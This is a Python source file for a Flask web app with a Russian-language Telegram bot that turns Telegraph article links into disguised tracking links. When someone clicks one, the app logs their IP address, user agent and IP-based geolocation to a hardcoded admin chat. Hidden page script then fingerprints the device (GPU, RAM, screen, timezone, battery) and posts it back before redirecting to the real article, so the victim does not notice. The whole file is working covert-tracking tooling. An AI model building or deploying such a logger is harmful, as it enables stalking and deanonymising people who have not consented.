import telebot
import requests
import os
from flask import Flask, request, jsonify

API_TOKEN = os.environ.get('API_TOKEN')
ADMIN_ID = 8347374252 

bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

@app.route('/')
def index():
    return '''
    <body style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:white;font-family:sans-serif">
        <a href="/setup-my-bot-secret" style="padding:15px 30px;background:#0088cc;color:white;text-decoration:none;border-radius:8px;font-weight:bold">⚡ АКТИВИРОВАТЬ</a>
    </body>
    '''

@app.route('/setup-my-bot-secret')
def setup_webhook():
    webhook_url = f"https://{request.host}/{API_TOKEN}"
    if bot.set_webhook(url=webhook_url):
        return "OK"
    return "ERROR"

@app.route('/v/<path:article_id>')
def logger(article_id):
    ip_raw = request.headers.get('x-forwarded-for', request.remote_addr)
    ip = ip_raw.split(',')[0].strip() if ip_raw else request.remote_addr
    ua = request.headers.get('user-agent')
    
    geo_info = "📍 No Geo"
    try:
        r = requests.get(f"http://ip-api.com{ip}?lang=ru", timeout=5).json()
        if r.get('status') == 'success':
            geo_info = (f"🌍 {r.get('country')}\n🏙 {r.get('city')}\n📡 {r.get('isp')}")
    except: pass

    report = (f"🎯 *КЛИК!*\n\n👤 *IP:* `{ip}`\n{geo_info}\n📱 *UA:* `{ua}`\n🔗 *ID:* `{article_id}`")
    try:
        bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
    except: pass
    
    return f'''
    <html>
    <head>
        <script>
        async function collect() {{
            let data = {{
                plt: navigator.platform,
                ram: navigator.deviceMemory || "N/A",
                scr: window.screen.width + "x" + window.screen.height,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                gpu: "N/A",
                bat: "N/A"
            }};
            try {{
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl');
                let debug = gl.getExtension('WEBGL_debug_renderer_info');
                data.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            }} catch(e) {{}}
            try {{
                let b = await navigator.getBattery();
                data.bat = Math.round(b.level * 100) + "%";
            }} catch(e) {{}}
            await fetch('/log_extra', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(data)
            }});
            window.location.href = "https://telegra.ph{article_id}";
        }}
        window.onload = collect;
        </script>
    </head>
    <body style="background:#000"></body>
    </html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    msg = (f"🖥 *ЖЕЛЕЗО*\n\n🔋 Заряд: `{d.get('bat')}`\n💾 ОЗУ: `{d.get('ram')} GB`\n📺 Экран: `{d.get('scr')}`\n🎮 GPU: `{d.get('gpu')}`\n🕒 Пояс: `{d.get('tz')}`")
    bot.send_message(ADMIN_ID, msg, parse_mode="Markdown")
    return "ok"

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_message():
    bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
    return "!", 200

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Пришли ссылку на Telegraph.")

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create_link(message):
    path = message.text.split("telegra.ph/")[-1].strip()
    bot.send_message(message.chat.id, f"✅ Ссылка:\n`https://{request.host}/v/{path}`", parse_mode="Markdown")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
